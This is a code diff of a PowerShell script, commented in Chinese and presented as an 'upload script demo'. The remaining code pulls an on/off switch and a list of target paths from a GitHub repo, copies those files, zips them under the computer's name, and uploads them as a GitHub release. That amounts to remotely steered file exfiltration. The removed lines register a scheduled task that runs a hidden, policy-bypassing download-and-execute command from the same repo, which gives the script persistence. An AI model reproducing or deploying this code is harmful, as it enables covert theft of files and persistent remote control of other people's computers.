@@ -1,68 +1,50 @@
-# ===== 初始化 =====
+# === console.ps1 上传脚本示范版 ===
+
 [Console]::OutputEncoding = [System.Text.UTF8Encoding]::UTF8
 $OutputEncoding = [System.Text.UTF8Encoding]::UTF8
 
 $repo = "ertgyhujkfghj/2"
 $token = $env:GH_TOKEN
-$taskName = "console"
-$scriptUrl = "https://raw.githubusercontent.com/$repo/main/console.ps1"
-
 if ([string]::IsNullOrEmpty($token)) {
     Write-Host "❌ GH_TOKEN 环境变量未设置，脚本终止。"
-    return
+    exit 1
 }
 
-# ===== 自动注册计划任务（若未存在） =====
-$taskExists = SCHTASKS /Query /TN $taskName 2>$null
-if ($LASTEXITCODE -ne 0) {
-    Write-Host "🛠️ 未检测到计划任务，正在注册..."
-
-    $taskRun = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"Invoke-Expression ((New-Object Net.WebClient).DownloadString('$scriptUrl'))`""
-    SCHTASKS /Create /TN $taskName /TR $taskRun /SC HOURLY /ST 19:30 /DU 04:30 /RI 30 /F
-
-    if ($LASTEXITCODE -eq 0) {
-        Write-Host "✅ 计划任务 '$taskName' 注册成功，将每天 19:30 至 0:00 每 30 分钟执行一次。"
-    } else {
-        Write-Host "❌ 计划任务注册失败。请以管理员身份运行此脚本。"
-        return
-    }
-}
-
-# ===== 检查开关 =====
+# 上传开关和路径配置URL
 $enabledUrl = "https://raw.githubusercontent.com/$repo/main/.github/upload-enabled.txt"
+$pathListUrl = "https://raw.githubusercontent.com/$repo/main/.github/upload-path.txt"
+
+# 检查上传开关
 try {
     $enabled = Invoke-RestMethod -Uri $enabledUrl -UseBasicParsing
     if ($enabled.Trim().ToLower() -ne "on") {
         Write-Host "🛑 上传开关未启用，脚本退出。"
-        return
+        exit 0
     }
 } catch {
-    Write-Host "❌ 无法读取上传开关：" $_
-    return
+    Write-Warning "❌ 无法读取上传开关：$($_.Exception.Message)"
+    exit 1
 }
 
-# ===== 获取路径列表 =====
-$pathListUrl = "https://raw.githubusercontent.com/$repo/main/.github/upload-path.txt"
+# 读取路径列表
 try {
     $pathsRaw = Invoke-RestMethod -Uri $pathListUrl -UseBasicParsing
     $uploadPaths = $pathsRaw -split "`n" | Where-Object { $_.Trim() -ne "" }
-    Write-Host "`n📦 上传路径列表："
-    $uploadPaths | ForEach-Object { Write-Host " - $_" }
 } catch {
-    Write-Host "❌ 无法读取路径配置：" $_
-    return
+    Write-Warning "❌ 无法读取路径配置：$($_.Exception.Message)"
+    exit 1
 }
 
-# ===== 拷贝文件到临时目录（尽可能包括被占用文件） =====
+# 创建临时目录
 $tempDir = "$env:TEMP\upload_temp_$(Get-Random)"
 New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
 
+# 拷贝文件及目录（不处理文件锁，直接复制）
 foreach ($path in $uploadPaths) {
     if (-not (Test-Path $path)) {
-        Write-Host "⚠️ 路径不存在，跳过：$path"
+        Write-Warning "⚠️ 路径不存在，跳过：$path"
         continue
     }
-
     $item = Get-Item $path -Force
     try {
         if ($item.PSIsContainer) {
@@ -79,17 +61,23 @@ foreach ($path in $uploadPaths) {
     }
 }
 
-# ===== 压缩为 ZIP =====
+# 压缩为 ZIP
 Add-Type -AssemblyName System.IO.Compression.FileSystem
 $computerName = $env:COMPUTERNAME
 $tag = "upload-$computerName-$(Get-Date -Format 'yyyyMMdd-HHmmss')"
 $zipPath = "$env:TEMP\$tag.zip"
-[System.IO.Compression.ZipFile]::CreateFromDirectory($tempDir, $zipPath)
+try {
+    [System.IO.Compression.ZipFile]::CreateFromDirectory($tempDir, $zipPath)
+} catch {
+    Write-Warning "❌ 压缩失败：$($_.Exception.Message)"
+    Remove-Item $tempDir -Recurse -Force
+    exit 1
+}
 
 # 清理临时目录
-Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue
+Remove-Item $tempDir -Recurse -Force
 
-# ===== 上传 ZIP 到 GitHub Release =====
+# 上传 ZIP
 $uploadUrl = "https://api.github.com/repos/$repo/releases"
 $headers = @{
     Authorization = "token $token"
@@ -114,8 +102,8 @@ try {
 
     Write-Host "`n✅ 上传成功：$tag.zip"
 } catch {
-    Write-Host "❌ 上传失败：" $_
+    Write-Warning "❌ 上传失败：$($_.Exception.Message)"
 }
 
-# 清理压缩包
-Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
+# 删除压缩包
+Remove-Item $zipPath -Force
